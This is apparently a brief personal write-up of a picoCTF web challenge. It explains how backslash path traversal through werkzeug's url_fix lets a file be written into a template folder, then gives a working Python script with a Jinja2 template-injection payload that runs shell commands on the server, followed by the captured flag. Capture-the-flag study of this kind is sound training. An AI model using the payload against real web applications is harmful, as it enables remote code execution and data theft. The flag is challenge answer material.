---
created: 2024-11-16T19:45
updated: 2024-11-16T19:48
---

Python path traversal + template injection.

```python
from werkzeug.urls import url_fix
```

`url_fix()` converts backslashes to slashes, I have encountered this before.

Which means we can path traverse using backslashes, to add files to the `../templates/errors/` directory.

Afterwards we can exploit the template include to include our custom templates.

```html
{% include "errors/" + error + ".html" ignore missing %}
```

```python
import requests
t = "https://notepad.mars.picoctf.net"
payload = "{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('cat *')['read']()}}"

p = ("../templates/errors/flag").ljust(128, "a")


url = requests.post(t+"/new", data={"content": p.replace("/", "\\")+".html"+payload}).url
error = url.split("/")[-1][:-len(".html")]

print(requests.get(t+"/", params={"error": error}).text)
```

```flag
picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
```